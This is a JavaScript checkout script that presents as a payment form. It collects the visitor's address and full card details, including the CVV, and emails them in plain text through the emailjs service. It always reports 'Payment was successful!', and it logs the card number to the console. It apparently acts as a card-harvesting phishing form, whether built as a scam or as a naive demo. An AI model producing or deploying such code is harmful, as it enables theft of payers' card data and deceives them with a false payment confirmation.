// Pay button variable
const button = document.querySelector("#payButton");

// Event listener for when the button is clicked
button.addEventListener("click", submitPayment);

// Function called after payment button is clicked
function submitPayment(e) {
  const email = document.getElementById("email").value;
  const country = document.getElementById("country").value;
  const firstName = document.getElementById("first-name").value;
  const lastName = document.getElementById("last-name").value;
  const address = document.getElementById("address").value;
  const apartment = document.getElementById("apartment").value;
  const city = document.getElementById("city").value;
  const state = document.getElementById("state").value;
  const zip = document.getElementById("zip").value;
  const cardName = document.getElementById("cardName").value;
  const cardNumber = document.getElementById("cardNumber").value;
  const expirationMonth = document.getElementById("expirationMonth").value;
  const expirationYear = document.getElementById("expirationYear").value;
  const cvv = document.getElementById("cvv").value;

  // Remove existing error messages
  const existingError = document.querySelector(".error-message");
  if (existingError) {
    existingError.remove();
  }

  // Check if any of the input fields are empty or invalid
  if (
    !email ||
    !country ||
    !firstName ||
    !lastName ||
    !address ||
    !city ||
    !state ||
    !zip ||
    !cardName ||
    !cardNumber ||
    !expirationMonth ||
    !expirationYear ||
    !cvv
  ) {
    displayErrorMessage("Please fill in all the details correctly.");
    return;
  }

  if (
    expirationMonth < 1 ||
    expirationMonth > 12 ||
    expirationYear < new Date().getFullYear()
  ) {
    displayErrorMessage("Please enter a valid expiry date.");
    return;
  }

  // Putting form items inside an object
  const templateParams = {
    message: `
    Email: ${email},
    Country: ${country},
    First name: ${firstName},
    Last name: ${lastName},
    Address: ${address},
    Apartment: ${apartment},
    City: ${city},
    State: ${state},
    Zip: ${zip},
    Card name: ${cardName},
    Card number: ${cardNumber},
    Expiration month: ${expirationMonth},
    Expiration year: ${expirationYear},
    CVV: ${cvv}`,
  };

  // using emailjs service to forward the object data to email
  emailjs
    .send("service", "template", templateParams)
    .then((response) => {
      console.log("SUCCESS!", response.status, response.text);
    })
    .catch((error) => {
      console.error("FAILED...", error);
    });

  // Display success messages
  displaySuccessMessage("Payment was successful!");
  console.log(templateParams);
  console.log(cardNumber);

  e.preventDefault();
}

function displayErrorMessage(message) {
  // Create a new div element for the error message
  const errorMessageDiv = document.createElement("div");
  errorMessageDiv.className = "error-message text-red-500";
  errorMessageDiv.innerText = message;

  // Insert the error message above the first child of the form
  const form = document.getElementById("paymentForm");
  form.insertBefore(errorMessageDiv, form.firstChild);
}

function displaySuccessMessage(message) {
  // Create a new div element for the success message
  const successMessageDiv = document.createElement("div");
  successMessageDiv.className = "success-message text-green-500";
  successMessageDiv.innerHTML = `<img src=""/>${message}`;

  // Display the success message in the message container
  const messageContainer = document.getElementById("messageContainer");
  messageContainer.appendChild(successMessageDiv);

  // Hide the form after successful payment
  document.getElementById("paymentForm").style.display = "none";
}
